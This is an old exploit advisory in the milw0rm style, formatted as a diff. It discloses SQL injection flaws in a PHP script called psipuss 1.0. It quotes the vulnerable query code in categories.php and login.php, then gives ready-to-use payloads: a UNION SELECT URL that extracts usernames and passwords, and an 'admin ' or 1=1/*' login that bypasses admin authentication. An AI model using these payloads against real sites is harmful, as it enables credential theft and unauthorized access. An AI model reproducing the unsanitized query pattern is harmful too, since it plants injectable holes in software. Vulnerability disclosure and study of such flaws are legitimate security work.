@@ -1,0 +1,48 @@
+           
+             ########################################################################
+             #                                                                      #
+             #  ...:::::psipuss version 1.0 SQL Injection Vulnerabilities ::::....  #           
+             ########################################################################
+
+Virangar Security Team
+
+www.virangar.net
+www.virangar.ir
+
+--------
+Discoverd By :virangar security team(hadihadi)
+
+special tnx to:MR.nosrati,black.shadowes,MR.hesy,Zahra
+
+& all virangar members & all hackerz
+
+greetz:to my best friend in the world hadi_aryaie2004
+& my lovely friend arash(imm02tal) from ISCN :)
+-----------------------------------
+vuln code in categories.php:
+line 5: if(!empty($_GET[Cid]))
+{
+        $qCTitle = "select * from `categories` where `Cid` = '$_GET[Cid]'";
+------------
+exploit:
+http://site.com/categories.php?Cid='/**/union/**/select/**/1,concat(Username,0x3a,char(58),Password),3,4,5/**/from/**/users/*
+--------------------------------
+                                .::::admin Authentication bypass vuln::::.
+vuln code in login.php:
+                                
+                                
+line 6: $Username = strip_tags($_POST[username]);
+line 7: $Password = strip_tags($_POST[password]);
+..
+..
+..
+line 18: $password11 = $_POST[password];
+line 19:                $qlogin = "select * from `users` where `Username` = '$Username' and `Password` = '$password11' and `Status` = 'Active'";
+---
+Exploit:
+User Name:admin ' or 1=1/*
+Password :[whatever]
+---
+young iranian h4ck3rz
+
+# milw0rm.com [2008-08-10]
